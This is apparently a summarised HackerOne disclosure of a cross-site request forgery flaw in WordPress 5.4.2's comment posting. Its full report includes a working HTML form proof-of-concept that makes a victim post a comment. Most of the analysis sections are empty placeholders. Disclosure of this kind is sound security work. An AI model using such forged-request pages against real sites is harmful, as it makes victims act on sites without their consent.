# CSRF on comment post

## Metadata
- **Source:** HackerOne
- **Report:** 914232 | https://hackerone.com/reports/914232
- **Submitted:** 2020-07-02
- **Reporter:** lamscun
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Wordpress,

I just found an CSRF on comment post. It allow attacker make victim comments on a post.

## Steps To Reproduce:
Attacker send to victim a link with content below:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wordpress-5.4.2/wordpress/wp-comments-post.php" method="POST">
      <input type="hidden" name="comment" v

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Wordpress,

I just found an CSRF on comment post. It allow attacker make victim comments on a post.

## Steps To Reproduce:
Attacker send to victim a link with content below:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wordpress-5.4.2/wordpress/wp-comments-post.php" method="POST">
      <input type="hidden" name="comment" value="csrf&#95;comment" />
      <input type="hidden" name="submit" value="Post&#32;Comment" />
      <input type="hidden" name="comment&#95;post&#95;ID" value="29" />
      <input type="hidden" name="comment&#95;parent" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

Video poc: {F891759}

## Impact

Attacker make victim comments on a post.

</details>

---
*Analysed by Claude on 2026-05-24*
